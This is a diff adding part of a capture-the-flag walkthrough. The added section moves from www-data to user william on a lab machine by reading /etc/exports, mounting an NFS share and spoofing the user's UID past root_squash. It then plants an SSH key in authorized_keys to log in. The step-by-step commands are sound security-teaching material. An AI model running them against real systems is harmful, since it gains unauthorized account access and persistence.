@@ -152,4 +152,108 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## Shell as william
 
+I enumerated a lot but nothing, then i turned back to nmap scan and bingo i missed NFS! NFS(Network File System) allows a system to share files & directories with others in a network. 
 
+If we try to identify the shared directory, we can see that isn't registered:
+
+```
+$ showmount -e 192.168.1.5
+clnt_create: RPC: Program not registered
+```
+
+We have to find it manually, this requires some NFS experience. We have to check `/etc/exports`:
+
+```
+www-data@undiscovered:/$ cat /etc/exports
+..data..
+
+/home/william	*(rw,root_squash)
+```
+
+Perfect, let's mount it now:
+
+```
+$ mkdir nfs
+$ mount 192.168.1.5:/home/william nfs
+```
+
+If we try to access it we get `permission denied`:
+
+```
+$ cd nfs
+cd: permission denied: nfs
+```
+
+Here we have to do a trick to bypass that, we can create a user with the same UID as william on our system.
+
+```
+www-data@undiscovered:/$ id william
+uid=3003(william) gid=3003(william) groups=3003(william)
+```
+
+```
+$ useradd pwner
+$ usermod -u 3003 pwner
+$ su - pwner
+$ cd nfs
+$ ls -la
+total 44
+drwxr-x--- 4 nobody 4294967294 4096 Sep  9 17:13 .
+drwxr-xr-x 4 root   root       4096 Sep 30 22:04 ..
+-rwxr-xr-x 1 nobody 4294967294  128 Sep  4 16:43 admin.sh
+-rw------- 1 nobody 4294967294    0 Sep  9 16:46 .bash_history
+-rw-r--r-- 1 nobody 4294967294 3771 Sep  4 17:16 .bashrc
+drwx------ 2 nobody 4294967294 4096 Sep  4 13:33 .cache
+drwxrwxr-x 2 nobody 4294967294 4096 Sep  4 16:49 .nano
+-rw-r--r-- 1 nobody 4294967294   43 Sep  4 17:19 .profile
+-rwsrwsr-x 1 nobody 4294967294 8776 Sep  4 17:11 script
+-rw-r----- 1 nobody 4294967294   39 Sep  9 17:13 user.txt
+```
+
+Perfect!! Now we can add our public key at `.ssh/authorized_keys`.
+
+```
+$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+
+Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:HEZFJoznGtXni0+9uzy9aunDC/4lMb6kNXHshB3E7V4 root@0xatomlab
+The key's randomart image is:
++---[RSA 3072]----+
+|       oo++   ...|
+|      ..+o. . ...|
+|       +o  o   o |
+|      .o..  . + E|
+|       oS  . B *.|
+|      .   . + O .|
+|           +.*.= |
+|          . **B .|
+|           o+*B=.|
++----[SHA256]-----+
+```
+
+```
+$ mkdir .ssh
+$ cd .ssh
+$ touch authorized_keys
+$ nano authorized_keys
+...
+$ cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkIemIDT2dpkzr8djT9UP/N3TVtcstLy8ZPt06DIUivHgU0psaMoU/4zcfneT1oI65ltAZ7z4wz9kwk94L4LrgvcsifqFBEQ37XN5Mw5jczXgpYaSZOwhMOy4W3BFknOtUHckL2yX52lFltqwiRj50Nyh23A70HoUcCeqxCXbNrcV53qxPrF4fn6wNeCZpkI4bPdSVkNTWA53+y9Txwhn3ypA25LoGCJGWrM+hSBEEW7WLBUioBulReWBieGNrYvWQV4DgNqFsTr1IJie8P07pMHVwWu4hiP/zAvGfn46W5MgycQpF19dWQH6nmIQAcnm1qQmusq646NLhFkKHNhsOy1w6xIeezKJTElu8z7QYeN+0fVSF1AwrPZiSBjI9piWRTp1+r9LW1qxvmYv/jGimYC3CF88815tiIEZSsJdZatB9PD7k3/ZODK+yuACxybVMZFJLnKMAV1Q3s76WOl/IFtQXLtpStiQtAiqv5qE/idC3gGG7SLWYLqLXdlFoR4c= root@0xatomlab
+```
+
+Now let's login in:
+
+```
+$ ssh -i id_rsa william@192.168.1.5
+
+william@undiscovered:~$ whoami;id
+william
+uid=3003(william) gid=3003(william) groups=3003(william)
+```
+
+## Shell as leonard
